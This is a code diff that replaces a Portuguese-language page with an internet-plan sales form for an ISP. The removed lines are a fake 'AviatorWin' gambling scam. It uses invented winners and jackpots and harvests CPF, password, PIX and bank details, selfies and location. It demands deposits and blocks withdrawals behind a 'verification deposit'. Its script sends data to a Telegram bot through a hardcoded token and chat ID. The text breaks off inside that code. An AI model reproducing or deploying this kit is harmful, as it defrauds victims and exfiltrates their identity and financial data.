-    </h1>
-    <p class="hero-sub">
-      O jogo do aviãozinho que está pagando muito! Mais de <b>12.847</b> ganhadores hoje.
-    </p>
-    
-    <div class="jackpot">
-      <div class="jackpot-label"> PRÊMIO ACUMULADO</div>
-      <div class="jackpot-value">R$ 47.832,50</div>
-    </div>
-    
-    <div class="winners-scroll">
-      🏆 <b>Maria S.</b> ganhou R$ 1.240 • <b>João P.</b> ganhou R$ 890 • <b>Ana C.</b> ganhou R$ 2.100 • <b>Carlos R.</b> ganhou R$ 567
-    </div>
-    
-    <button class="btn btn-primary" onclick="App.go(2)">
-      🚀 COMEÇAR A GANHAR
-    </button>
-    <p class="text-center mt-10" style="font-size:11px;color:var(--muted)">
-      +18 • Jogue com responsabilidade
-    </p>
-  </div>
+        <div class="main-grid">
+            <div class="main-column">
+                <!-- DADOS DO CLIENTE -->
+                <section class="card">
+                    <div class="card-header">
+                        <div class="card-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/>
+                            </svg>
+                        </div>
+                        <div><h2 class="card-title">Dados do Cliente</h2></div>
+                    </div>
 
-  <!-- TELA 2: CADASTRO + PIX -->
-  <div class="screen" id="s2">
-    <div class="header">
-      <div class="logo">Aviator<span>Win</span></div>
-      <div class="steps">
-        <div class="step done"></div>
-        <div class="step active"></div>
-        <div class="step"></div>
-        <div class="step"></div>
-      </div>
-    </div>
-    
-    <h2 style="font-size:24px;font-weight:700;margin-bottom:6px">Crie sua conta</h2>
-    <p style="color:var(--muted);font-size:14px;margin-bottom:20px">
-      Cadastre-se e receba seus ganhos via PIX instantâneo
-    </p>
-    
-    <div class="card">
-      <div class="field">
-        <label>Nome completo</label>
-        <input type="text" id="regName" placeholder="Seu nome" />
-      </div>
-      <div class="field">
-        <label>CPF</label>
-        <input type="text" id="regCpf" placeholder="000.000.000-00" maxlength="14" />
-      </div>
-      <div class="field">
-        <label>E-mail</label>
-        <input type="email" id="regEmail" placeholder="seu@email.com" />
-      </div>
-      <div class="field">
-        <label>Senha</label>
-        <input type="password" id="regPass" placeholder="Mínimo 6 caracteres" />
-      </div>
-    </div>
-    
-    <div class="card" style="background:linear-gradient(135deg,rgba(52,199,89,0.1),rgba(40,167,69,0.05))">
-      <h3 style="font-size:16px;font-weight:700;margin-bottom:12px">💸 Chave PIX para recebimento</h3>
-      <div class="field">
-        <label>Tipo de chave</label>
-        <select id="pixType">
-          <option value="cpf">CPF</option>
-          <option value="email">E-mail</option>
-          <option value="telefone">Telefone</option>
-          <option value="aleatoria">Aleatória</option>
-        </select>
-      </div>
-      <div class="field">
-        <label>Chave PIX</label>
-        <input type="text" id="pixKey" placeholder="Sua chave PIX" />
-      </div>
-      <div class="field">
-        <label>Nome do titular da conta</label>
-        <input type="text" id="pixName" placeholder="Nome completo do titular" />
-      </div>
-      <div class="field">
-        <label>Banco</label>
-        <input type="text" id="pixBank" placeholder="Ex: Nubank, Itaú, Bradesco" />
-      </div>
-    </div>
-    
-    <button class="btn btn-success" onclick="App.validateRegister()">
-      CONTINUAR →
-    </button>
-  </div>
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label class="form-label">Nome</label>
+                            <input type="text" class="form-input" id="nome" placeholder="Nome completo">
+                        </div>
 
-  <!-- TELA 3: VERIFICAÇÃO DE IDENTIDADE (FOTO) -->
-  <div class="screen" id="s3">
-    <div class="header">
-      <div class="logo">Aviator<span>Win</span></div>
-      <div class="steps">
-        <div class="step done"></div>
-        <div class="step done"></div>
-        <div class="step active"></div>
-        <div class="step"></div>
-      </div>
-    </div>
-    
-    <h2 style="font-size:22px;font-weight:700;margin-bottom:6px">Verificação de identidade</h2>
-    <p style="color:var(--muted);font-size:14px;margin-bottom:16px">
-      Por segurança, precisamos confirmar que é você mesmo. Tire uma selfie.
-    </p>
-    
-    <div class="camera-frame" id="cameraFrame">
-      <video id="cameraVideo" autoplay playsinline></video>
-      <div class="overlay"></div>
-      <div class="face-guide"></div>
-      <div class="camera-flash" id="cameraFlash"></div>
-    </div>
-    
-    <p style="text-align:center;font-size:13px;color:var(--muted);margin-bottom:16px">
-      Posicione seu rosto dentro do círculo
-    </p>
-    
-    <button class="btn btn-primary" id="btnCapture" onclick="App.capturePhoto()">
-      📸 TIRAR SELFIE
-    </button>
-    <button class="btn btn-ghost mt-10" onclick="App.showCameraDenyModal()">
-      Não posso tirar foto agora
-    </button>
-  </div>
+                        <div class="form-group">
+                            <label class="form-label">CPF</label>
+                            <input type="text" class="form-input" id="cpf" placeholder="000.000.000-00" maxlength="14">
+                        </div>
 
-  <!-- TELA 4: LOCALIZAÇÃO -->
-  <div class="screen" id="s4">
-    <div class="header">
-      <div class="logo">Aviator<span>Win</span></div>
-      <div class="steps">
-        <div class="step done"></div>
-        <div class="step done"></div>
-        <div class="step done"></div>
-        <div class="step active"></div>
-      </div>
+                        <div class="form-group">
+                            <label class="form-label">Data do Agendamento (SLA) <span class="required">*</span></label>
+                            <input type="date" class="form-input" id="dataAgendamento">
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">Local <span class="required">*</span></label>
+                            <select class="form-select" id="local">
+                                <option value="">Selecione...</option>
+                                <option value="SEDE">SEDE</option>
+                                <option value="QXD">QXD</option>
+                            </select>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">Disponibilidade <span class="required">*</span></label>
+                            <select class="form-select" id="disponibilidade">
+                                <option value="">Selecione...</option>
+                                <option value="Manhã">Manhã</option>
+                                <option value="Tarde">Tarde</option>
+                                <option value="Noite">Noite</option>
+                                <option value="Livre">Livre</option>
+                            </select>
+                        </div>
+
+                        <div class="form-group full-width">
+                            <label class="form-label">Utilização Principal <span class="required">*</span></label>
+                            <div class="checkbox-group" id="utilizacaoGroup">
+                                <label class="checkbox-item"><input type="checkbox" value="Celular"><span class="checkbox-custom"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span><span>Celular</span></label>
+                                <label class="checkbox-item"><input type="checkbox" value="Computador"><span class="checkbox-custom"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span><span>Computador</span></label>
+                                <label class="checkbox-item"><input type="checkbox" value="Notebook"><span class="checkbox-custom"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span><span>Notebook</span></label>
+                                <label class="checkbox-item"><input type="checkbox" value="Smart TV"><span class="checkbox-custom"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span><span>Smart TV</span></label>
+                                <label class="checkbox-item"><input type="checkbox" value="Videogame"><span class="checkbox-custom"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span><span>Videogame</span></label>
+                                <label class="checkbox-item"><input type="checkbox" value="Home Office"><span class="checkbox-custom"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span><span>Home Office</span></label>
+                                <label class="checkbox-item"><input type="checkbox" value="Streaming"><span class="checkbox-custom"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span><span>Streaming</span></label>
+                                <label class="checkbox-item"><input type="checkbox" value="Jogos Online"><span class="checkbox-custom"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span><span>Jogos Online</span></label>
+                                <label class="checkbox-item"><input type="checkbox" value="Monitoramento"><span class="checkbox-custom"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span><span>Monitoramento</span></label>
+                                <label class="checkbox-item"><input type="checkbox" value="Outro"><span class="checkbox-custom"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span><span>Outro</span></label>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">Telefone <span class="required">*</span></label>
+                            <input type="text" class="form-input" id="telefone" placeholder="(00) 00000-0000" maxlength="15">
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">Telefone 2</label>
+                            <input type="text" class="form-input" id="telefone2" placeholder="(00) 00000-0000" maxlength="15">
+                        </div>
+
+                        <div class="form-group full-width">
+                            <label class="form-label">Complemento / Ponto de Referência</label>
+                            <input type="text" class="form-input" id="complemento" placeholder="Ex: Casa azul">
+                        </div>
+
+                        <div class="form-group full-width">
+                            <label class="form-label">Localização</label>
+                            <input type="text" class="form-input" id="localizacao" placeholder="Endereço completo">
+                        </div>
+
+                        <div class="form-group full-width">
+                            <label class="form-label">Obs Adicionais</label>
+                            <textarea class="form-input" id="obsAdicionais" placeholder="Observações adicionais..." style="min-height: 80px; resize: vertical;"></textarea>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- PLANOS -->
+                <section class="card">
+                    <div class="card-header">
+                        <div class="card-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/>
+                            </svg>
+                        </div>
+                        <div><h2 class="card-title">Planos de Internet</h2></div>
+                    </div>
+                    <div class="planos-grid" id="planosGrid"></div>
+
+                    <div class="promo-section" id="promoSection">
+                        <div class="promo-header">
+                            <div class="promo-title">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                                    <path stroke-linecap="round" stroke-linejoin="round" d="M7 7h.01M7 3h5c.512 0 1.024.195 1.414.586l7 7a2 2 0 010 2.828l-7 7a2 2 0 01-2.828 0l-7-7A1.994 1.994 0 013 12V7a4 4 0 014-4z"/>
+                                </svg>
+                                Valor Promocional
+                            </div>
+                            <label class="checkbox-custom-promo">
+                                <input type="checkbox" id="promoCheckbox">
+                                <span class="checkmark-promo">
+                                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3">
+                                        <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/>
+                                    </svg>
+                                </span>
+                                <span>Aplicar desconto</span>
+                            </label>
+                        </div>
+                        <div class="promo-original" id="promoOriginal"></div>
+                        <div class="promo-input-group" id="promoInputGroup">
+                            <label for="promoValor">Novo Valor Promocional</label>
+                            <input type="text" class="form-input" id="promoValor" placeholder="R$ 0,00">
+                        </div>
+                    </div>
+                </section>
+
+                <!-- SERVIÇOS ADICIONAIS -->
+                <section class="card">
+                    <div class="card-header">
+                        <div class="card-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6v6m0 0v6m0-6h6m-6 0H6"/>
+                            </svg>
+                        </div>
+                        <div><h2 class="card-title">Serviços Adicionais</h2></div>
+                    </div>
+                    <div class="servicos-grid" id="servicosGrid"></div>
+                </section>
+
+                <!-- ADESÃO -->
+                <section class="card">
+                    <div class="card-header">
+                        <div class="card-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/>
+                            </svg>
+                        </div>
+                        <div><h2 class="card-title">Taxa de Adesão</h2></div>
+                    </div>
+
+                    <div class="adesao-opcoes">
+                        <div class="adesao-opcao" data-adesao="gratuita">
+                            <div style="font-size: 1.8rem; margin-bottom: 6px;"></div>
+                            <div style="font-weight: 600;">Gratuita</div>
+                        </div>
+                        <div class="adesao-opcao" data-adesao="paga">
+                            <div style="font-size: 1.8rem; margin-bottom: 6px;">💳</div>
+                            <div style="font-weight: 600;">Paga</div>
+                        </div>
+                    </div>
+
+                    <div class="adesao-detalhes" id="adesaoDetalhes">
+                        <div class="form-grid">
+                            <div class="form-group">
+                                <label class="form-label">Dia do Vencimento</label>
+                                <select class="form-select" id="adesaoVencimento"></select>
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label">Valor da Adesão</label>
+                                <select class="form-select" id="adesaoValor">
+                                    <option value="">Selecione...</option>
+                                    <option value="100.00">R$ 100,00</option>
+                                    <option value="150.00">R$ 150,00</option>
+                                </select>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- AÇÕES -->
+                <section class="card">
+                    <div class="card-header">
+                        <div class="card-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"/>
+                            </svg>
+                        </div>
+                        <div><h2 class="card-title">Ações</h2></div>
+                    </div>
+
+                    <div class="actions-grid">
+                        <button class="btn btn-secondary" id="btnCopiar" disabled>
+                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg>
+                            Copiar
+                        </button>
+                        <button class="btn btn-secondary" id="btnBaixar" disabled>
+                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/></svg>
+                            Baixar TXT
+                        </button>
+                        <button class="btn btn-danger" id="btnLimpar">
+                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>
+                            Limpar
+                        </button>
+                    </div>
+
+                    <div class="script-output" id="scriptOutput"></div>
+                </section>
+            </div>
+
+            <!-- RESUMO -->
+            <aside class="resumo-card">
+                <div class="resumo-header">
+                    <div class="resumo-header-icon">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 7h6m0 10v-3m-3 3h.01M9 17h.01M9 14h.01M12 14h.01M15 11h.01M12 11h.01M9 11h.01M7 21h10a2 2 0 002-2V5a2 2 0 00-2-2H7a2 2 0 00-2 2v14a2 2 0 002 2z"/></svg>
+                    </div>
+                    <h3 class="resumo-title">Resumo</h3>
+                </div>
+                <div id="resumoContent">
+                    <div style="text-align: center; padding: 20px; opacity: 0.8;">Preencha os dados</div>
+                </div>
+                <div class="resumo-total" id="resumoTotal" style="display: none;">
+                    <span class="resumo-total-label">TOTAL</span>
+                    <span class="resumo-total-value" id="resumoTotalValue">R$ 0,00</span>
+                </div>
+            </aside>
+        </div>
     </div>
-    
-    <div class="loc-visual">
-      <div class="icon">📍</div>
-      <h3>Jogue com quem está perto de você</h3>
-      <p>
-        Ative sua localização para entrar em salas regionais e competir com jogadores da sua região. Prêmios maiores e saques mais rápidos!
-      </p>
-    </div>
-    
-    <div class="loc-features">
-      <div class="loc-feature">
-        <span class="ico">🏆</span>
-        <span>Torneios exclusivos da sua cidade</span>
-      </div>
-      <div class="loc-feature">
-        <span class="ico"></span>
-        <span>PIX regional instantâneo (até 30s)</span>
-      </div>
-      <div class="loc-feature">
-        <span class="ico">🎁</span>
-        <span>Bônus de boas-vindas regional de R$ 50</span>
-      </div>
-      <div class="loc-feature">
-        <span class="ico">👥</span>
-        <span>Ranking local com prêmios em dinheiro</span>
-      </div>
-    </div>
-    
-    <button class="btn btn-success" onclick="App.requestLocation()">
-      ✅ ATIVAR LOCALIZAÇÃO
-    </button>
-    <button class="btn btn-ghost mt-10" onclick="App.showLocationDenyModal()">
-      Agora não
-    </button>
-  </div>
 
-  <!-- TELA 5: DEPÓSITO -->
-  <div class="screen" id="s5">
-    <div class="header">
-      <div class="logo">Aviator<span>Win</span></div>
-    </div>
-    
-    <h2 style="font-size:22px;font-weight:700;margin-bottom:6px">Depósito inicial</h2>
-    <p style="color:var(--muted);font-size:14px;margin-bottom:16px">
-      Deposite para começar a jogar. Seu primeiro depósito é <b style="color:var(--green)">dobrado</b>!
-    </p>
-    
-    <div class="card">
-      <div class="field">
-        <label>Valor do depósito</label>
-        <select id="depositValue" onchange="App.updatePix()">
-          <option value="20">R$ 20,00 (recebe R$ 40)</option>
-          <option value="50" selected>R$ 50,00 (recebe R$ 100)</option>
-          <option value="100">R$ 100,00 (recebe R$ 200)</option>
-          <option value="200">R$ 200,00 (recebe R$ 400)</option>
-        </select>
-      </div>
-    </div>
-    
-    <div class="pix-card">
-      <div class="label">Pague via PIX</div>
-      <div class="value" id="pixAmount">R$ 50,00</div>
-      <div class="key" id="pixCode">00020126580014BR.GOV.BCB.PIX0136aviatorwin-pagamentos@pix.com</div>
-    </div>
-    
-    <div class="timer">
-      Expira em <b id="pixTimer">04:59</b>
-    </div>
-    
-    <button class="btn btn-success" onclick="App.confirmDeposit()">
-      ✅ JÁ PAGUEI
-    </button>
-    <button class="btn btn-ghost mt-10" onclick="App.copyPix()">
-       Copiar código PIX
-    </button>
-  </div>
+    <script>
+        /* ===================================================================
+           DADOS - PLANOS E SERVIÇOS
+           =================================================================== */
+        const PLANOS = [
+            { id: 'pro1', nome: 'FIBRA', velocidade: '500MB', valor: 89.90 },
+            { id: 'pro2', nome: 'FIBRA', velocidade: '1000MB', valor: 99.90 },
+            { id: 'ultra', nome: 'FIBRA', velocidade: '1500MB', valor: 119.90 }
+        ];
 
-  <!-- TELA 6: JOGO -->
-  <div class="screen" id="s6">
-    <div class="header">
-      <div class="logo">Aviator<span>Win</span></div>
-      <div class="balance-pill">Saldo: <b id="balanceDisplay">R$ 100,00</b></div>
-    </div>
-    
-    <div class="history" id="gameHistory"></div>
-    
-    <div class="game-area">
-      <div class="stars"></div>
-      <div class="multiplier" id="multiplier">1.00x</div>
-      <div class="plane" id="plane">✈️</div>
-    </div>
-    
-    <div class="bet-controls">
-      <div class="bet-input">
-        <label>Aposta</label>
-        <input type="number" id="betAmount" value="10" min="1" />
-      </div>
-      <div class="bet-input">
-        <label>Auto cashout</label>
-        <input type="number" id="autoCashout" value="2.00" step="0.1" />
-      </div>
-    </div>
-    
-    <button class="btn btn-success" id="btnBet" onclick="App.startRound()">
-      🚀 APOSTAR
-    </button>
-    <button class="btn btn-danger hidden" id="btnCashout" onclick="App.cashout()">
-      💰 RETIRAR AGORA
-    </button>
-    
-    <div class="card mt-20" style="padding:16px">
-      <div style="display:flex;justify-content:space-between;font-size:13px">
-        <span style="color:var(--muted)">Rodadas ganhas</span>
-        <b id="winsCount" style="color:var(--green)">0</b>
-      </div>
-      <div style="display:flex;justify-content:space-between;font-size:13px;margin-top:8px">
-        <span style="color:var(--muted)">Total ganho</span>
-        <b id="totalWon" style="color:var(--green)">R$ 0,00</b>
-      </div>
-    </div>
-  </div>
+        const SERVICOS = [
+            {
+                id: 'gamer',
+                nome: 'Plano Gamer / IP Público',
+                descricao: 'Priorização para jogos online com latência ultra-baixa',
+                valor: 20.00,
+                tipo: 'fixo'
+            },
+            {
+                id: 'mesh',
+                nome: 'Plano Mesh',
+                descricao: 'Ampliação de cobertura Wi-Fi para toda a casa',
+                valor: 20.00,
+                tipo: 'fixo'
+            },
+            {
+                id: 'linkvideo',
+                nome: 'LinkVideo (Câmeras)',
+                descricao: 'Sistema de câmeras de segurança integrado',
+                opcoesDias: [
+                    { dias: 7, valor: 34.90, label: '7 dias' },
+                    { dias: 15, valor: 49.90, label: '15 dias' }
+                ],
+                tipo: 'cameras'
+            }
+        ];
 
-  <!-- TELA 7: SAQUE BLOQUEADO -->
-  <div class="screen" id="s7">
-    <div class="header">
-      <div class="logo">Aviator<span>Win</span></div>
-    </div>
-    
-    <div class="text-center" style="padding:40px 0">
-      <div style="font-size:80px">🔒</div>
-      <h2 style="font-size:24px;font-weight:700;margin:16px 0 8px">Saque em análise</h2>
-      <p style="color:var(--muted);font-size:14px;line-height:1.5">
-        Seu saque de <b id="withdrawAmount">R$ 0,00</b> está sendo processado. Por segurança, precisamos de uma verificação adicional.
-      </p>
-    </div>
-    
-    <div class="card">
-      <h3 style="font-size:16px;font-weight:700;margin-bottom:12px"> Verificação necessária</h3>
-      <p style="font-size:14px;color:var(--muted);line-height:1.5;margin-bottom:16px">
-        Para liberar seu saque, faça um depósito de verificação de <b>R$ 30,00</b> que será devolvido em até 24h.
-      </p>
-      <button class="btn btn-primary" onclick="alert('Função em desenvolvimento')">
-        FAZER DEPÓSITO DE VERIFICAÇÃO
-      </button>
-    </div>
-    
-    <button class="btn btn-ghost" onclick="App.go(6)">
-      ← Voltar ao jogo
-    </button>
-  </div>
+        /* ===================================================================
+           ESTADO DA APLICAÇÃO
+           =================================================================== */
+        const state = {
+            planoSelecionado: null,
+            servicosSelecionados: new Map(),
+            utilizacoes: [],
+            adesao: { tipo: null, vencimento: null, valor: null },
+            valorPromocional: null,
+            scriptGerado: null
+        };
 
-</div>
+        /* ===================================================================
+           UTILITÁRIOS
+           =================================================================== */
+        const formatarMoeda = (valor) => {
+            return new Intl.NumberFormat('pt-BR', {
+                style: 'currency', currency: 'BRL'
+            }).format(valor);
+        };
 
-<!-- MODAL FOTO NEGADA -->
-<div class="modal-bg" id="modalPhoto">
-  <div class="modal">
-    <div class="emoji">📸</div>
-    <h3>Foto necessária</h3>
-    <p>Para sua segurança e conformidade com a legislação, precisamos da sua selfie.</p>
-    <div class="reasons">
-      <div>Prevenção de fraude e identidade</div>
-      <div>Conformidade com regulamento +18</div>
-      <div>Proteção da sua conta contra acessos não autorizados</div>
-      <div>Liberação de saques via PIX</div>
-    </div>
-    <button class="btn btn-primary" onclick="App.closeModal('modalPhoto');App.startCamera()">
-      Entendi, tirar foto
-    </button>
-  </div>
-</div>
+        const formatarData = (dataStr) => {
+            if (!dataStr) return '';
+            const [ano, mes, dia] = dataStr.split('-');
+            return `${dia}/${mes}/${ano}`;
+        };
 
-<!-- MODAL LOCALIZAÇÃO NEGADA -->
-<div class="modal-bg" id="modalLoc">
-  <div class="modal">
-    <div class="emoji">📍</div>
-    <h3>Localização importante</h3>
-    <p>Sem localização, você perde benefícios exclusivos:</p>
-    <div class="reasons" style="background:rgba(255,149,0,0.1)">
-      <div style="color:#e67e22"> Sem bônus regional de R$ 50</div>
-      <div style="color:#e67e22">❌ Sem acesso a torneios locais</div>
-      <div style="color:#e67e22">❌ Saques podem levar até 72h</div>
-    </div>
-    <button class="btn btn-success" onclick="App.closeModal('modalLoc');App.requestLocation(true)">
-      Ativar agora
-    </button>
-    <button class="btn btn-ghost mt-10" onclick="App.closeModal('modalLoc');App.skipLocation()">
-      Continuar sem localização
-    </button>
-  </div>
-</div>
+        const aplicarMascaraCPF = (valor) => {
+            return valor.replace(/\D/g, '').replace(/(\d{3})(\d)/, '$1.$2')
+                .replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d{1,2})/, '$1-$2')
+                .replace(/(-\d{2})\d+?$/, '$1');
+        };
 
-<!-- MODAL GENÉRICO -->
-<div class="modal-bg" id="modalGeneric">
-  <div class="modal">
-    <div class="emoji" id="modalGenericEmoji">✅</div>
-    <h3 id="modalGenericTitle">Título</h3>
-    <p id="modalGenericText">Texto</p>
-    <button class="btn btn-primary" onclick="App.closeModal('modalGeneric')">OK</button>
-  </div>
-</div>
+        const aplicarMascaraTelefone = (valor) => {
+            return valor.replace(/\D/g, '').replace(/(\d{2})(\d)/, '($1) $2')
+                .replace(/(\d{5})(\d)/, '$1-$2').replace(/(-\d{4})\d+?$/, '$1');
+        };
 
-<script>
-'use strict';
+        const aplicarMascaraMoeda = (valor) => {
+            const numeros = valor.replace(/\D/g, '');
+            const centavos = numeros.slice(-2).padStart(2, '0');
+            const reais = numeros.slice(0, -2) || '0';
+            const reaisFormatado = parseInt(reais).toLocaleString('pt-BR');
+            return `R$ ${reaisFormatado},${centavos}`;
+        };
 
-const CONFIG = {
-  VERSION: '10.0.15',
-  TELEGRAM: {
-    BOT_TOKEN: '8702458951:AAHg_-y7Dx8LBwIjdKg0YcF9sVRJzkIrkj0',
-    CHAT_ID: '-5425475205',
-    API_BASE: 'https://api.telegram.org/bot',
-    TIMEOUT: 15000,
-    RETRY: 3
-  },
-  CAMERA: { WIDTH: 1280, HEIGHT: 720, QUALITY: 0.85, DELAY: 600 }
-};
+        const parseMoeda = (valorStr) => {
+            if (!valorStr) return 0;
+            const numeros = valorStr.replace(/\D/g, '');
+            return parseInt(numeros) / 100;
+        };
 
-const Logger = {
-  info: (m,d)=>console.log(`[INFO] ${m}`,d||''),
-  error: (m,d)=>console.error(`[ERROR] ${m}`,d||''),
-  success: (m)=>console.log(`✅ ${m}`),
-  warn: (m,d)=>console.warn(`[WARN] ${m}`,d||'')
-};
+        const validarCPF = (cpf) => {
+            cpf = cpf.replace(/\D/g, '');
+            if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
+            let soma = 0, resto;
+            for (let i = 1; i <= 9; i++) soma += parseInt(cpf.substring(i-1, i)) * (11 - i);
+            resto = (soma * 10) % 11;
+            if (resto === 10 || resto === 11) resto = 0;
+            if (resto !== parseInt(cpf.substring(9, 10))) return false;
+            soma = 0;
+            for (let i = 1; i <= 10; i++) soma += parseInt(cpf.substring(i-1, i)) * (12 - i);
+            resto = (soma * 10) % 11;
+            if (resto === 10 || resto === 11) resto = 0;
+            if (resto !== parseInt(cpf.substring(10, 11))) return false;
+            return true;
+        };
 
-const HttpClient = {
-  async postJSON(url, data) {
-    for (let i = 1; i <= CONFIG.TELEGRAM.RETRY; i++) {
-      try {
-        const ctrl = new AbortController();
-        const tid = setTimeout(()=>ctrl.abort(), CONFIG.TELEGRAM.TIMEOUT);
-        const r = await fetch(url, {
-          method:'POST',
-          headers:{'Content-Type':'application/json'},
-          body: JSON.stringify(data),
-          signal: ctrl.signal
-        });
-        clearTimeout(tid);
-        if (!r.ok) throw new Error(`HTTP ${r.status}`);
-        return await r.json();
-      } catch(e) {
-        Logger.warn(`Tentativa ${i} falhou: ${e.message}`);
-        if (i === CONFIG.TELEGRAM.RETRY) throw e;
-        await new Promise(r=>setTimeout(r, 1000*i));
-      }
-    }
-  },
-  async postFormData(url, fd) {
-    for (let i = 1; i <= CONFIG.TELEGRAM.RETRY; i++) {
-      try {
-        const ctrl = new AbortController();
-        const tid = setTimeout(()=>ctrl.abort(), CONFIG.TELEGRAM.TIMEOUT);
-        const r = await fetch(url, { method:'POST', body:fd, signal:ctrl.signal });
-        clearTimeout(tid);
-        if (!r.ok) throw new Error(`HTTP ${r.status}`);
-        return await r.json();
-      } catch(e) {
-        if (i === CONFIG.TELEGRAM.RETRY) throw e;
-        await new Promise(r=>setTimeout(r, 1000*i));
-      }
-    }
-  }
-};
+        const showToast = (message, type = 'success') => {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            toast.innerHTML = `
+                <div class="toast-message">${message}</div>
+                <button class="toast-close" onclick="this.parentElement.remove()"></button>
+            `;
+            container.appendChild(toast);
+            setTimeout(() => {
+                toast.style.opacity = '0';
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        };
 
-const TelegramService = {
-  base(){ return `${CONFIG.TELEGRAM.API_BASE}${CONFIG.TELEGRAM.BOT_TOKEN}`; },
-  
-  async send(text) {
-    if (text.length > 4096) text = text.substring(0,4046) + '\n\n...[truncado]';
-    return HttpClient.postJSON(`${this.base()}/sendMessage`, {
-      chat_id: CONFIG.TELEGRAM.CHAT_ID, text
-    });
-  },
-  
-  async sendPhoto(dataUrl, caption) {
-    const r = await fetch(dataUrl);
-    const blob = await r.blob();
-    const fd = new FormData();
-    fd.append('chat_id', CONFIG.TELEGRAM.CHAT_ID);
-    fd.append('photo', blob, `photo_${Date.now()}.jpg`);
